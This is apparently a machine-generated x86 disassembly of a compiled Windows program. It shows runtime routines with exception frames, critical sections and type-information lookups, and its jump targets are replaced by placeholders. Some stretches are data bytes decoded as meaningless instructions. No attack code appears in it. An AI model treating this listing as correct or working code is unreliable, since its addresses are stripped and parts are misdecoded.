sub edx 0x2
jb r-xdata
mov eax [ ebp + 0x8 ]
mov edi [ eax - 0x10 ]
cmp [ edi ] 0x100
jne r-xdata
mov eax ebx
add eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
or si 0x4000
mov [ edx + eax * 8 ] si
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x10 ]
mov ecx [ ecx ]
mov [ edx + eax * 8 + 0x8 ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax ]
cmp [ eax ] 0x100
jne r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x10 ]
mov ecx [ ecx ]
mov [ edx + eax * 8 + 0x8 ] ecx
jmp r-xdata
dec edx
je r-xdata
mov eax ebx
add eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi edi
lea edi [ edx + eax * 8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x10 ] 0xc
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
lea esi [ edx + eax * 8 ]
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404528
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404860
xor eax eax
mov [ esi + 0x4 ] eax
mov edi ebx
add edi edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + edi * 8 ] 0x8
mov eax [ esi ]
call sub_404870
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + edi * 8 + 0x8 ] eax
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
jmp r-xdata
push 0x8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax ]
mov ecx eax
mov edx [ ebp + 0x8 ]
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_4152e8
sub edx 0x4
je r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x10 ]
mov ecx [ ecx ]
mov [ edx + eax * 8 + 0x8 ] ecx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x10 ]
mov ecx [ ecx + 0x4 ]
mov [ edx + eax * 8 + 0xc ] ecx
mov eax [ ebp + 0x8 ]
add [ eax - 0x10 ] 0x4
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_4152a8
sub_41569c
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_415938
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0xc ]
movzx eax [ eax + 0x1 ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x38 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x20 ]
lea edx [ edx + ecx + 0x3 ]
call sub_404200
mov edx [ ebp - 0x38 ]
lea ecx [ ebp - 0x24 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40526c
add esp 0x4
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x8 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40526c
add esp 0x4
mov esi [ ebp - 0x20 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
mov al [ eax ]
dec al
je r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
dec al
je r-xdata
push ebp
mov eax ebx
call sub_4153e4
pop ecx
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x24 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x44 ]
test al al
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
test al al
jne r-xdata
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp - 0x1c ]
mov ebx [ ebp - 0x18 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov esi [ eax ]
call [ esi + 0x48 ]
test al al
jne r-xdata
mov ebx [ ebp - 0xc ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x14 ]
call sub_4152cc
xor eax eax
push ebp
push sub_4157e7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
call sub_41405c
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4152a8
jmp r-xdata
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x14 ]
call sub_4152a8
jmp r-xdata
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41593f
lea eax [ ebp - 0x3c ]
call sub_404714
lea eax [ ebp - 0x38 ]
call sub_404008
lea eax [ ebp - 0x24 ]
call sub_404008
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40538c
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_40538c
retn
dec ebx
mov eax [ ebp - 0x8 ]
lea esi [ eax + ebx * 8 ]
cmp [ esi + 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x14 ]
call sub_4152d4
retn
mov eax [ ebp - 0x14 ]
call sub_4152a8
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x48 ]
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4152a8
jmp r-xdata
cmp [ ebp - 0x20 ] 0x1
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4152a8
mov eax [ ebp - 0x14 ]
call sub_4152a8
jmp r-xdata
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov eax [ esi ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404910
mov edx [ ebp - 0x3c ]
mov eax [ esi + 0x4 ]
call sub_404290
mov eax [ ebp - 0x4 ]
push eax
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x24 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x4c ]
test al al
jne r-xdata
sub_415978
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_415a20
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_4050b0
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_415a30
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415b06
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_415ae9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_4050b8
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415af0
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_403184
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_40426c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_408110
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_415b20
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_415b8f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415b96
retn
call sub_414da8
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_40538c
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_404abc
mov eax rw-data
call sub_404008
mov eax rw-data
call sub_40f300
sub_415b98
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_415c39
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415c40
retn
mov eax rw-data
call sub_41405c
mov eax sub_40f000
mov [ rw-data ] eax
mov eax sub_40eba4
mov [ rw-data ] eax
mov edx sub_40eab4
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40f300
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_413c40
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f614
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_41287c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_412fa4
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_415c44
push 0x92004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ebx + 0x680000ff ] dl
push es
dec eax
add [ edi + edi * 8 + 0x6680000 ] dl
dec eax
add [ ebp + 0x680000ff ] dl
push es
dec eax
add [ esi + 0x680000ff ] dl
push es
dec eax
add [ edi + 0x680000ff ] dl
push es
dec eax
add [ eax + 0x680000ff ] bl
push es
dec eax
add [ ecx + 0x680000ff ] bl
push es
dec eax
add [ edx + 0x680000ff ] bl
push es
dec eax
add [ ebx + 0x680000ff ] bl
push es
dec eax
add [ edi + edi * 8 + 0x6680000 ] bl
dec eax
add [ ebp + 0x680000ff ] bl
push es
dec eax
add [ esi + 0x680000ff ] bl
push es
dec eax
add [ edi + 0x680000ff ] bl
push es
dec eax
add [ eax + 0x680000ff ] al
push es
dec eax
add [ ecx + 0x680000ff ] al
push es
dec eax
add [ edx + 0x680000ff ] al
push es
dec eax
add [ ebx + 0x680000ff ] al
push es
dec eax
add [ edi + edi * 8 + 0x6680000 ] al
dec eax
add [ ebp + 0x680000ff ] al
push es
dec eax
add [ esi + 0x680000ff ] al
push es
dec eax
add [ edi + 0x680000ff ] al
push es
dec eax
add [ eax + 0x680000ff ] cl
push es
dec eax
add [ ecx + 0x680000ff ] cl
push es
dec eax
add [ edx + 0x680000ff ] cl
push es
dec eax
add [ ebx + 0x680000ff ] cl
push es
dec eax
add [ edi + edi * 8 + 0x6680000 ] cl
dec eax
add [ ebp + 0x680000ff ] cl
push es
dec eax
add [ esi + 0x680000ff ] cl
push es
dec eax
add [ edi + 0x680000ff ] cl
push es
dec eax
add [ eax - 0x1 ] dh
add [ eax ] al
push 0x71004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edx - 0x1 ] dh
add [ eax ] al
push 0x73004806
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_415d79
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415d80
retn
sub_415eac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_415f94
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_4039c0
pop ecx
pop edx
pop ebx
retn
sub_415fc0
push ebx
push esi
push ecx
mov [ esp ] ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_40317c
mov ecx [ esp ]
mov edx esi
call sub_415fe0
pop edx
pop esi
pop ebx
retn
sub_415fe0
push ebx
push esi
push ecx
mov [ esp ] ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_403474
mov ecx [ esp ]
mov edx esi
call sub_416838
pop edx
pop esi
pop ebx
retn
sub_416000
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x5 ] cl
mov esi edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_416257
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_415b18
mov ecx [ r-xdata ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_415fc0
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebx ]
mov esi [ eax ]
xor eax eax
mov al [ esi ]
cmp eax 0x11
ja r-xdata
mov eax esi
call sub_415f94
jmp r-xdata
lea eax [ esi + 0x1 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x4
lea eax [ ebp - 0x20 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_4039c0
jmp [ eax * 4 + jump_table_416071 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41625e
lea eax [ ebp - 0x18 ]
call sub_404714
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_40402c
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416870
mov edx eax
mov eax edi
mov cl 0xfc
call sub_4136f4
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417068
mov eax edi
call sub_4138ec
jmp r-xdata
mov eax edi
lea edx [ esi + 0x1 ]
call sub_413954
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416e40
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_413928
jmp r-xdata
lea ecx [ ebp - 0x18 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416eac
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_4139a4
jmp r-xdata
mov ecx edi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41738c
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417444
push edx
push eax
mov eax edi
call sub_4137f0
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416870
mov edx eax
mov eax [ ebx ]
mov ecx [ eax ]
mov eax edi
call sub_414724
jmp r-xdata
mov eax esi
call sub_416634
mov eax [ eax + 0x9 ]
mov eax [ eax ]
cmp eax [ r-xdata ]
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416940
mov edx [ ebp - 0xc ]
mov eax edi
call sub_413928
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416870
mov edx eax
mov eax edi
mov cl 0xfc
call sub_4136f4
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4169b4
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_413928
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416870
mov edx eax
mov eax edi
mov cl 0xfc
call sub_4136f4
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416870
mov edx eax
mov eax edi
call sub_4138c4
jmp r-xdata
sub_41626c
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x18 ]
mov eax [ eax - 0x4 ]
call sub_41186c
call sub_402a08
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ebp + 0x14 ]
jne r-xdata
jl r-xdata
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
jmp r-xdata
jle r-xdata
cmp eax [ ebp + 0x8 ]
jbe r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x10
jmp r-xdata
sub_4162d4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_416588
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ r-xdata ]
mov edx esi
mov eax edi
call sub_415fc0
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebx ]
mov eax [ eax ]
call sub_416634
mov esi eax
mov eax [ ebx ]
mov eax [ eax ]
movzx eax [ eax ]
cmp eax 0x11
ja r-xdata
mov eax esi
call sub_415f94
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax ]
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x4
lea eax [ ebp - 0x20 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_4039c0
jmp [ eax * 4 + jump_table_416343 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41658f
lea eax [ ebp - 0x18 ]
call sub_404714
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_40402c
retn
mov eax [ esi + 0x5 ]
cmp eax [ esi + 0x1 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_413f34
cmp ax 0x100
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_413f34
cmp ax 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41186c
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx ebx
mov eax edi
call sub_417180
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_413f7c
mov ecx [ ebp - 0x14 ]
mov edx ebx
mov eax edi
call sub_416e80
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_413fc0
mov ecx [ ebp - 0x18 ]
mov edx ebx
mov eax edi
call sub_416f94
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax edi
call sub_4173cc
jmp r-xdata
push ebp
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0xc ]
push [ esi + 0x8 ]
call sub_41626c
pop ecx
push edx
push eax
mov edx ebx
mov eax edi
call sub_41746c
jmp r-xdata
mov eax [ ebx ]
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_414a74
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax edi
call sub_4168e4
jmp r-xdata
push ebp
mov eax [ esi + 0x1 ]
xor edx edx
push edx
push eax
mov eax [ esi + 0x5 ]
xor edx edx
push edx
push eax
call sub_41626c
pop ecx
mov ecx eax
mov edx ebx
mov eax edi
call sub_4168e4
jmp r-xdata
push ebp
mov eax [ esi + 0x1 ]
cdq
push edx
push eax
mov eax [ esi + 0x5 ]
cdq
push edx
push eax
call sub_41626c
pop ecx
mov ecx eax
mov edx ebx
mov eax edi
call sub_4168e4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_413f34
cmp ax 0xb
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_413f7c
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax edi
call sub_416964
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_413f7c
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax edi
call sub_416be4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40ff1c
mov ecx eax
mov edx ebx
mov eax edi
call sub_4168e4
jmp r-xdata
push ebp
mov eax [ esi + 0x1 ]
cdq
push edx
push eax
mov eax [ esi + 0x5 ]
cdq
push edx
push eax
call sub_41626c
pop ecx
mov ecx eax
mov edx ebx
mov eax edi
call sub_4168e4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41186c
call sub_402a08
test edx edx
jge r-xdata
mov ecx eax
mov edx ebx
mov eax edi
call sub_4168e4
jmp r-xdata
neg eax
adc edx 0x0
neg edx
sub_41659c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4165f7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov cl 0x1
mov edx [ ebp + 0x8 ]
call sub_416000
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40f614
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4165fe
lea eax [ ebp - 0x10 ]
call sub_40f300
retn
sub_41660c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_4162d4
mov al 0x1
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_416640
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4166fe
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi ] 0x1
jne r-xdata
mov eax esi
call sub_416634
mov eax [ eax + 0x9 ]
mov eax [ eax ]
call sub_416634
cmp esi [ r-xdata ]
je r-xdata
mov edx edi
mov eax ebx
call sub_408344
jmp r-xdata
mov eax edi
test ebx ebx
setne dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
call sub_40405c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_408110
test al al
je r-xdata
cmp [ eax + 0x1 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416705
lea eax [ ebp - 0x4 ]
call sub_404008
retn
lea edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_408030
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40405c
jmp r-xdata
lea esi [ eax + 0xd ]
test ebx ebx
je r-xdata
mov eax edi
mov edx esi
call sub_40426c
xor eax eax
mov al [ esi ]
inc eax
add esi eax
dec ebx
test ebx ebx
jne r-xdata
sub_416718
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_416764
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_416634
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_408480
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_416718
mov edx [ rw-data ]
mov eax esi
call sub_408110
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_408110
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_408480
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_4167c8
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_416838
push ebx
push ecx
mov [ esp ] ecx
call sub_4167c8
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop edx
pop ebx
retn
mov eax [ r-xdata ]
cmp eax [ esp ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
cmp al 0x1f
ja r-xdata
jb r-xdata
and eax 0x7f
bt [ esp ] eax
xor ebx ebx
sub_416870
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
